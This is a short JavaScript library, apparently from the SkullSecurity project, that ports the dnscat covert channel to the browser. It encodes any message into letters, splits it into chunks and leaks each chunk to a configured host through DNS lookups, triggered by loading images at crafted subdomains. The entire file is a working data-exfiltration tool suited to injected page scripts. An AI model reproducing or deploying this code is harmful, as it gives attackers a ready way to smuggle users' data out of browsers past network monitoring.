/*
 * skullsecurity.jsdnscatcat.js
 * By Stefan Penner
 * Created December, 2009
 *
 * (See LICENSE.txt)
 *
 * An JavaScript imlementation of Ron's dnscat.
 *
 */

var SkullSecurity = SkullSecurity || {};

(function(lib){
  var seq = Math.floor(Math.random()*Math.pow(2,32));

  lib.jsdnscat = lib.jsdnscat || {};
  lib.jsdnscat.config = lib.jsdnscat.config || {};

  function nel(s){
    var c,result ='',i;
    for(i=0;i<s.length;i++){
      c = s.charCodeAt(i);
      result += String.fromCharCode((c >> 0x04) + 97);
      result += String.fromCharCode((c &  0x0F) + 97);
    }
    return result;
  }

  lib.jsdnscat.send = function(message){ 
    if(!lib.jsdnscat.config.host){
      alert('Please configure a host: <lib>.jsdnscat.config.host = "..."');
      return;
    }
    message = message +"";

    var start   = 0,
        end     = 31,
        count   = Math.floor((message.length+1)/32+1),
        chunk   = "";

    (function(){
      chunk = message.slice(start,end), url = "";

      if(!chunk) {return;}
      //    http://dnscat.<flags>.<count>.<data>.skullseclabs.org 
      url = "http://dnscat.0."+count+"."+nel(chunk)+"."+seq++ +"."+lib.jsdnscat.config.host;
      (new Image()).src = url;
      start += 31;
      end   += 31;
      setTimeout(arguments.callee,100);
    })();
  };
})(SkullSecurity);
